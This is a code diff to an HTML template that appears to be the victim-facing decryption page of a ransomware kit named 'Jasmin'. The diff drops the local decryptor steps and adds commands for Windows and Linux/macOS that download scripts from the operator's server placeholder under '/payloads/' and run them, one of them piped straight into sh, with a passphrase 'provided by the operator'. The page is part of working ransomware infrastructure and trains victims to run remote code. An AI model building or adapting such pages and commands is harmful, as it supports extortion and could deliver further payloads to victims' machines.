@@ -34,18 +34,14 @@ ol{padding-left:20px}
 </ol>
 
 <h2>💻 Windows Decryption</h2>
-<ol>
-<li>Run <code>Jasmin_Decryptor.exe</code></li>
-<li>Select the <code>.pem</code> private key file</li>
-<li>Click <b>Decrypt</b> — all files will be automatically restored</li>
-</ol>
+<p>Requires PowerShell 7+ (<code>winget install Microsoft.PowerShell</code>)</p>
+<pre style="background:#1a1a2e;border:1px solid #333;padding:10px;border-radius:6px;overflow-x:auto;color:#4dc3fa">curl.exe -sL {{SERVER_URL}}/payloads/jasmin_unlock.ps1 -o unlock.ps1
+pwsh -File unlock.ps1 -Server {{SERVER_URL}} -K "&lt;解密口令&gt;" -Paths C:\目标目录</pre>
 
 <h2>🐧 Linux / macOS Decryption</h2>
-<ol>
-<li>Install: <code>pip3 install cryptography</code></li>
-<li>Run: <code>python3 jasmin_decrypt.py private_key.pem</code></li>
-<li>Optional: specify dirs <code>python3 jasmin_decrypt.py key.pem /home /var</code></li>
-</ol>
+<p>Pure <code>openssl</code> — no dependencies to install.</p>
+<pre style="background:#1a1a2e;border:1px solid #333;padding:10px;border-radius:6px;overflow-x:auto;color:#4dc3fa">curl -sL {{SERVER_URL}}/payloads/jasmin_unlock.sh | sh -s {{SERVER_URL}} "&lt;解密口令&gt;" &lt;目标目录&gt;</pre>
+<p>The decryption passphrase and target directory are provided by the operator.</p>
 
 <p style="margin-top:16px">✅ <b>SHA-256 integrity verification</b> ensures every file is restored to its exact original state.</p>
 
